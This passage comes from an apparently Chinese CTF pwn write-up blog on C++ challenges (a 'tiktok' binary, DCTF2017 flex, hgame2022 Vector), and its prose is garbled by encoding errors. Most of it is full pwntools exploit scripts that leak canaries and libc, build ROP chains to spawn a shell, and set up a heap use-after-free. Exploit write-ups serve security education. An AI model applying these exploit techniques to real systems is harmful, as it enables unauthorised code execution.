class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./tiktok&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./tiktok&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;$ &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">password</span>):<br>    sla(<span class="hljs-string">b&#x27;:&#x27;</span>,password)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">sex,<span class="hljs-built_in">type</span>,age,name</span>):<br>    payload = <span class="hljs-string">b&#x27;Add &#x27;</span><br>    payload += sex + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += <span class="hljs-built_in">type</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += <span class="hljs-built_in">str</span>(age).encode() + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += name<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">sex</span>):<br>    payload = <span class="hljs-string">b&#x27;Show&#x27;</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += sex<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">info</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Info &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Delete &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu, payload)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">convert</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    payload = <span class="hljs-string">b&#x27;Convert &#x27;</span> + <span class="hljs-built_in">id</span><br>    sla(menu, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name</span>):<br>    payload = <span class="hljs-string">b&#x27;Edit &#x27;</span><br>    payload += <span class="hljs-built_in">id</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += name<br>    sla(menu,payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">follow</span>(<span class="hljs-params">action,id1,id2</span>):<br>    payload = <span class="hljs-string">b&#x27;Follow &#x27;</span><br>    payload += action + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += id1 + <span class="hljs-string">b&#x27; &#x27;</span><br>    payload += id2 + <span class="hljs-string">b&#x27; &#x27;</span><br>    sla(menu, payload)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">clone</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,name</span>):<br>    paylaod = <span class="hljs-string">b&#x27;Clone &#x27;</span><br>    paylaod += <span class="hljs-built_in">id</span> + <span class="hljs-string">b&#x27; &#x27;</span><br>    paylaod += name<br>    sla(menu,paylaod)<br><br>login(<span class="hljs-string">b&#x27;TikTokAdmin&#x27;</span>)<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x30</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">9</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">9</span>)<br>canary = u64(rc(<span class="hljs-number">7</span>).rjust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;canary&quot;</span>,canary)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary))<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value1 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value1&quot;</span>,stack_value1)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary) + p64(stack_value1))<br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value2 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value2&quot;</span>,stack_value2)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + p64(canary) + p64(stack_value1) + p64(stack_value2))<br><br>elf_base = stack_value2 - <span class="hljs-number">0x39a0</span><br>pop_rdi = elf_base + <span class="hljs-number">0x000000000000ea73</span><br>main = elf_base + <span class="hljs-number">0x49f3</span><br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>ru(<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>)<br>stack_value3 = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>leak(<span class="hljs-string">&quot;stack_value2&quot;</span>,stack_value3)<br>payload = p64(canary) + p64(stack_value1) + p64(stack_value2) + p64(stack_value3) + \<br>          p64(pop_rdi) + p64(elf_base + elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(elf_base + elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]) + p64(main)<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + payload)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>login(<span class="hljs-string">b&#x27;TikTokAdmin&#x27;</span>)<br><br><br>delete(<span class="hljs-string">b&#x27;W6&#x27;</span>)<br>login(<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br>payload = p64(canary) + p64(stack_value1) + p64(stack_value2) + p64(stack_value3) + \<br>          p64(elf_base + <span class="hljs-number">0x00000000000096c3</span>) + p64(pop_rdi) + p64(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))) + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])<br>login(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x38</span> + payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="DCTF2017-flexğŸ¤ª"><a href="#DCTF2017-flexğŸ¤ª" class="headerlink" title="DCTF2017 flexğŸ¤ª"></a>DCTF2017 flexğŸ¤ª</h2><p>ä½œä¸ºä¸€ä¸ªæ²¡æ‰“è¿‡OIï¼Œæ›´ä¸ä¼šC++çš„è’»ç¬±ï¼Œå¼‚å¸¸å¤„ç†è¿™ç©æ„ç›´æ¥æ¶‰åŠåˆ°ç¬”è€…ç›²åŒºäº†ã€‚</p><p>é¦–å…ˆè¿™é¢˜ä¸èƒ½è¯´æ˜¯ä¸€ä¸ªçº¯ç§çš„C++ pwné¢˜ï¼Œåªèƒ½è¯´æ˜¯ä¸€ä¸ªCå’ŒC++çš„<del>æ‚ç§</del>æ‚ä¿®~~</p><p>IDAæ‰“å¼€ï¼Œé€‰é¡¹4å¾ˆè¯±äººï¼Œä½†ä»”ç»†ä¸€çœ‹åŸºæœ¬ä¸Šåˆ©ç”¨ä¸äº†ï¼Œéš¾å—ï¼Œå°±åƒæ‰“äº†è„šæ²¡ğŸå‡ºæ¥ä¸€æ ·éš¾å—ğŸ˜°</p><p>ç„¶åé€‰é¡¹3æ˜¯ä¸ªFWï¼ŒğŸ‘´åªèƒ½çœ‹function1&amp;2äº†</p><p><img src="/img/C++/6.png" alt="img"></p><p>å¾ˆæ˜æ˜¾çš„è´Ÿæ•°æº¢å‡ºï¼Œç„¶åå¯ä»¥æ ˆæº¢å‡ºå˜¿å˜¿å˜¿ï¼Œä½†æ˜¯è¿™ç©æ„æœ‰ä¸ªcanaryï¼Œbadï¼Œè¿™æ¯”ğŸä¸å‡ºæ¥è¿˜è¦éš¾å—ğŸ¥µ</p><p>ä½†æ˜¯å¾ˆæ˜æ˜¾è¿™ä¸ªfuncé‡Œå­˜åœ¨å¥‡æ€ªçš„ä¸œè¥¿ï¼Œthrowï¼ŒğŸ‘´æ„Ÿè§‰è¿™ç©æ„æœ‰é—®é¢˜ï¼Œä½†æ˜¯ğŸ‘´8çŸ¥é“å“ªé‡Œæœ‰é—®é¢˜ã€‚</p><p><img src="/img/C++/7.png" alt="img"></p><p>æ‘¸ä¸å‡ºæ¥çš„ğŸ‘´åªèƒ½å»ç½‘ä¸Šå†²æµªï¼Œå‘å¾®çš„çªåœ¨é˜´æš—çš„ä¸‹æ°´é“é‡Œè¯»ç€å¤§è·Œä»¬çš„wp</p><p>ç„¶åğŸ‘´æ˜ç™½å•¦</p><h3 id="å¼‚å¸¸å¤„ç†æœºåˆ¶"><a href="#å¼‚å¸¸å¤„ç†æœºåˆ¶" class="headerlink" title="å¼‚å¸¸å¤„ç†æœºåˆ¶"></a>å¼‚å¸¸å¤„ç†æœºåˆ¶</h3><p>tryã€throwã€catchè¿™ä¸‰ä¸ªå§é¾™å‡¤é›æ€»æ˜¯ä¸€èµ·å‡ºç°</p><p>ThrowæŠ›å‡ºå¼‚å¸¸ï¼Œtry åŒ…å«å¼‚å¸¸æ¨¡å—ï¼Œcatch æ•æ‰æŠ›å‡ºçš„å¼‚å¸¸</p><p>å½“ç¨‹åºthrowä¸€ä¸ªå¼‚å¸¸çš„æ—¶å€™ï¼ŒåŸºæœ¬æµç¨‹æ˜¯è¿™æ ·çš„å–µ</p><p>1ã€è°ƒç”¨ __cxa_allocate_exception å‡½æ•°ï¼Œåˆ†é…ä¸€ä¸ªå¼‚å¸¸å¯¹è±¡ã€‚</p><p><img src="/img/C++/8.png" alt="img"></p><p>2ã€è°ƒç”¨ __cxa_throw å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¼šå°†å¼‚å¸¸å¯¹è±¡åšä¸€äº›åˆå§‹åŒ–ã€‚</p><p><img src="/img/C++/9.png" alt="img"></p><p>3ã€__cxa_throw() è°ƒç”¨ _Unwind_RaiseException() ä»è€Œå¼€å§‹ unwindï¼ˆunwindâ€œå›é€€â€æ˜¯ä¼´éšå¼‚å¸¸å¤„ç†æœºåˆ¶å¼•å…¥ C++ ä¸­çš„ä¸€ä¸ªæ–°æ¦‚å¿µï¼Œä¸»è¦ç”¨æ¥ç¡®ä¿åœ¨å¼‚å¸¸è¢«æŠ›å‡ºã€æ•è·å¹¶å¤„ç†åï¼Œæ‰€æœ‰ç”Ÿå‘½æœŸå·²ç»“æŸçš„å¯¹è±¡éƒ½ä¼šè¢«æ­£ç¡®åœ°ææ„ï¼Œå®ƒä»¬æ‰€å ç”¨çš„ç©ºé—´ä¼šè¢«æ­£ç¡®åœ°å›æ”¶ã€‚ï¼‰ã€‚</p><p><img src="/img/C++/10.png" alt="img"></p><p>4ã€_Unwind_RaiseException() å¯¹è°ƒç”¨é“¾ä¸Šçš„å‡½æ•°è¿›è¡Œ unwind æ—¶ï¼Œè°ƒç”¨ personality routineã€‚</p><p>5ã€å¦‚æœè¯¥å¼‚å¸¸å¦‚èƒ½è¢«å¤„ç†(æœ‰ç›¸åº”çš„ catch)ï¼Œåˆ™ personality routine ä¼šä¾æ¬¡å¯¹è°ƒç”¨é“¾ä¸Šçš„å‡½æ•°è¿›è¡Œæ¸…ç†ã€‚</p><p>6ã€_Unwind_RaiseException() å°†æ§åˆ¶æƒè½¬åˆ°ç›¸åº”çš„catchä»£ç ã€‚</p><p>ç„¶åğŸ‘´å°±å‘ç°å¼‚å¸¸å¤„ç†åğŸ‘´å°±æ¥åˆ°äº†ä¸€ä¸ªå¥‡æ€ªçš„åœ°æ–¹</p><p><img src="/img/C++/11.png" alt="img"></p><p>ä»”ç»†ä¸€çœ‹ï¼Œæ¬¸ï¼ŒåŸæ¥function1é‡Œçš„tryå’Œcatchæ¨¡å—åç¼–è¯‘æ—¶å¹¶æ²¡æœ‰å‡ºæ¥ã€‚</p><p>é‚£è¿™ä¹ˆä¸€è¯´ï¼ŒğŸ‘´ä»å­™å­å‡½æ•°è·³åˆ°äº†å„¿å­å‡½æ•°å¹¶ä¸”æ²¡æœ‰ç»è¿‡canaryçš„checkï¼Œwinï¼ï¼</p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œè¯¥æ€ä¹ˆé£Ÿç”¨è¿™ä¸ªæ¼æ´æã€‚</p><p>6å¹´å‰çˆ¹çˆ¹ä»¬çš„æ€è·¯æ˜¯ï¼šå¦‚æœå¼‚å¸¸è¢«ä¸Šä¸€ä¸ªå‡½æ•°çš„catchæ•è·ï¼Œæ‰€ä»¥rbpå˜æˆäº†ä¸Šä¸€ä¸ªå‡½æ•°çš„rbpï¼Œ è€Œé€šè¿‡æ„é€ ä¸€ä¸ªpayloadæŠŠä¸Šä¸€ä¸ªå‡½æ•°çš„rbpä¿®æ”¹æˆstack_pivotåœ°å€ï¼Œ ä¹‹åä¸Šä¸€ä¸ªå‡½æ•°è¿”å›çš„æ—¶å€™æ‰§è¡Œleave retï¼Œè¿™æ ·ä¸€æ¥æˆ‘ä»¬å°±èƒ½æˆåŠŸç»•è¿‡canaryçš„æ£€æŸ¥è€Œä¸”è¿›ä¸€æ­¥æˆ‘ä»¬ä¹Ÿèƒ½æ§åˆ¶eipï¼Œï¼Œå»æ‰§è¡Œäº†stack_pivotä¸­çš„ropäº†ã€‚</p><p>å¦™ï¼Œå®åœ¨æ˜¯å¦™å•Šã€‚</p><p>PSï¼šè¿”å›åœ°å€ä¸€å®šè¦å¡«tryå’Œcatchä¹‹é—´çš„åœ°å€ï¼ˆåªæœ‰è¿™æ ·æ‰èƒ½è¢«æ•è·å¼‚å¸¸ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./flex&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./flex&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>pop_rdi = <span class="hljs-number">0x00000000004044d3</span><br>ret = <span class="hljs-number">0x0000000000400ba9</span><br><br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;)\n&#x27;</span>,<span class="hljs-string">b&#x27;no&#x27;</span>)<br><br>sla(<span class="hljs-string">b&#x27;)\n&#x27;</span>,<span class="hljs-string">b&#x27;yes&#x27;</span>)<br><br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-built_in">str</span>(-<span class="hljs-number">2</span>).encode())<br>gdb.attach(p,<span class="hljs-string">&quot;b *0x40134f\nc\n&quot;</span>)<br>paylaod = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x120</span> + p64(<span class="hljs-number">0x6061c0</span>) + p64(<span class="hljs-number">0x401512</span>)<br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,paylaod)<br><br>payload = flat([<br>    <span class="hljs-number">0x4044ca</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>],<span class="hljs-number">0x100</span>,<span class="hljs-number">0x606260</span>,<span class="hljs-number">0</span>,<br>    <span class="hljs-number">0x4044b0</span>,<br>    <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>])<br>sla(<span class="hljs-string">b&#x27;:\n&#x27;</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(ret)+p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="hljs-string">&#x27;puts&#x27;</span>])+payload)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>payload = p64(<span class="hljs-number">0xe3afe</span>+libc.address)<br>sl(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure><p>çˆ½å•Šï¼Œæœç„¶è¿˜æ˜¯ğŸå‡ºæ¥æ‰æ˜¯æœ€çˆ½çš„å•ŠğŸ˜‹</p><h2 id="hgame2022-VectorğŸ˜"><a href="#hgame2022-VectorğŸ˜" class="headerlink" title="hgame2022 VectorğŸ˜"></a>hgame2022 VectorğŸ˜</h2><p>è·Ÿvectorå®¹å™¨æœ‰å…³çš„ä¸€é“èœå•å †</p><p>å¤šäº†ä¸€ä¸ªmove functionï¼Œé‚£é—®é¢˜è‚¯å®šåœ¨é‡Œé¢ã€‚</p><p><img src="/img/C++/12.png" alt="img"></p><p>å½“moveè¾“å…¥çš„nex_idxè¿‡å¤§æ—¶ï¼Œresizeä¼šç”³è¯·ä¸€ä¸ªæ›´å¤§çš„chunkï¼Œå¹¶æŠŠåŸæ¥chunkä¸­çš„æ•°æ®å¤åˆ¶è¿‡å»ã€‚å¯ä»¥çœ‹åˆ°ï¼Œè¿™ä¸ªæ“ä½œæ˜¯åœ¨note[idx]</p><p>&#x3D; nullpträ¹‹å‰ï¼Œå› æ­¤note[idx] &#x3D; nullptrå®é™…ä¸Šæ˜¯åœ¨ç»™å·²ç»åºŸå¼ƒçš„noteä¸­çš„idxç½®0ã€‚è¿™æ ·ä¾¿èƒ½é€ æˆUAFã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./vector&#x27;</span>)<br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;182.92.164.148&#x27;</span>, <span class="hljs-number">48649</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./vector&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; &#x27;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(menu,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(menu,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">move</span>(<span class="hljs-params">new_index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(menu,<span class="hljs-built_in">str</span>(new_index).encode())<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    add(i,<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>    delete(<span class="hljs-number">7</span>-i)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>):<br>    add(i,<span class="hljs-number">0x50</span>,<span class="hljs-string">b&#x27;aaaaaaaa&#x27;</span>)<br><br>show(<span class="hljs-number">0</span>)<br>ru(<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">8</span>)<br>libc.address = u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1ecc70</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br>move(<span class="hljs-number">10</span>)<br>move(<span class="hljs-number">9</span>)<br><br>move(<span class="hljs-number">32</span>)<br><br><span 